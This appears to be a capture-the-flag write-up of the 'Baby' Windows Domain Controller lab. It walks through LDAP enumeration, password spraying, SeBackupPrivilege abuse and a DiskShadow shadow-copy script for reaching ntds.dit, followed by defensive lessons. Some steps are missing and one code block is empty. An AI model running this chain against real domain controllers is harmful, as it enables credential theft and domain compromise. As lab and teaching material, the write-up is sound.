## Introduction

Baby is an Easy difficulty Windows Domain Controller machine that demonstrates the critical importance of understanding Windows backup privileges and Active Directory security. The attack chain involves LDAP enumeration to discover a password hint, credential spraying to gain initial access, and leveraging `SeBackupPrivilege` to extract the NTDS.dit database and dump domain credentials.

The machine showcases how a single overprivileged account with backup privileges can lead to complete domain compromise through Volume Shadow Copy exploitation and offline credential extraction.

### Understanding SeBackupPrivilege

`SeBackupPrivilege` allows an account to read files using Windows backup semantics, bypassing normal NTFS permissions:
```bash
Caroline.Robinson
│
├─→ Normal NTFS permissions: Cannot read Administrator's files
│
└─→ SeBackupPrivilege enables backup-mode access
│
└─→ Can read all protected files
```

### Testing Backup Access

Confirmed backup-mode access could bypass permissions:

```powershell

```

**Result:**

Successfully read protected file despite lacking normal permissions.

### Volume Shadow Copy Exploitation

Since the target was a Domain Controller, the most valuable protected file was the Active Directory database:

C:\Windows\NTDS\ntds.dit


However, the live database is actively locked by AD DS service. Created a Volume Shadow Copy (VSS) snapshot using DiskShadow:

**Created DiskShadow script:**

```powershell
echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii
echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append
echo "create" | out-file ./diskshadow.txt -encoding ascii -append
echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append
```

**Content:**
```bash
set context persistent nowriters
add volume c: alias temp
create
expose %temp% z:
```

**Executed snapshot creation:**

```powershell
diskshadow.exe /s c:\temp\diskshadow.txt
```

**Result:**
```bash
Alias temp for shadow ID {3fc2ba41-f506-415b-9f26-eac3af057759} set as environment variable.
Shadow copy device name: \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
The shadow copy was successfully exposed as z:.
```

## Lessons Learned

### 1. LDAP Information Disclosure

Anonymous LDAP queries revealed sensitive information:
- User accounts
- Group memberships
- Password hints in description fields

**Defense:** Disable anonymous LDAP binds and sanitize user descriptions.

### 2. Password Hint as Attack Surface

Teresa Bell's password hint in the LDAP description field was the entry point:

description: Set initial password to BabyStart123!


**Defense:** Do not store passwords or hints in LDAP attributes; use secure password management systems.

### 3. Credential Reuse Across Accounts

The password hint worked for another account (Caroline Robinson), suggesting poor password policy enforcement.

**Defense:** Enforce unique, strong passwords on all accounts and require password changes immediately upon first login.

### 4. SeBackupPrivilege is Dangerous

`SeBackupPrivilege` is often overlooked but provides:
- Access to files protected by NTFS permissions
- Access to system files and registry hives
- On Domain Controllers: Access to NTDS.dit

**Defense:** 
- Audit accounts with SeBackupPrivilege
- Restrict membership in Backup Operators group
- Implement privileged access workstations (PAWs)

### 5. Volume Shadow Copy Exploitation

VSS snapshots are designed for disaster recovery but can be abused:
- Can access point-in-time copies of protected files
- DiskShadow can be executed by unprivileged users with appropriate privileges
- Snapshots can bypass active file locks

**Defense:**
- Restrict access to DiskShadow
- Implement CIS Controls for privileged access
- Monitor VSS creation and exposure events

### 6. NTDS.dit Extraction is Game Over

Once NTDS.dit is obtained:
- All domain NTLM hashes can be extracted offline
- Kerberos keys can be extracted for forged tickets
- Pass-the-hash becomes trivial

**Defense:**
- Protect Domain Controllers physically and logically
- Use Credential Guard on DCs
- Monitor and alert on NTDS.dit access attempts
- Implement Smart Card authentication to reduce hash dependency

### 7. Domain Controllers Require Exceptional Security

On a DC, a single overprivileged account can compromise the entire domain:

Single Account with SeBackupPrivilege
│
▼
Complete Domain Compromise


**Defense:**
- Minimize DC user accounts
- Use tiered administrative access
- Implement MFA for all administrative access
- Regular security audits of DC permissions

## Summary

Baby demonstrated how LDAP information disclosure, password hints, credential reuse, and overprivileged backup accounts can lead to complete domain compromise. The exploitation chain was linear but devastating: initial foothold → privilege analysis → backup privilege abuse → VSS exploitation → credential extraction → domain takeover.

The key lesson was that Domain Controllers require exceptional security: a single misconfigured account with backup privileges can expose the entire active directory database and allow extraction of all domain credentials.

**Final Result:** LDAP Enumeration → Password Spray → SeBackupPrivilege → VSS Snapshot → NTDS.dit Extraction → Pass-the-Hash → SYSTEM ✓
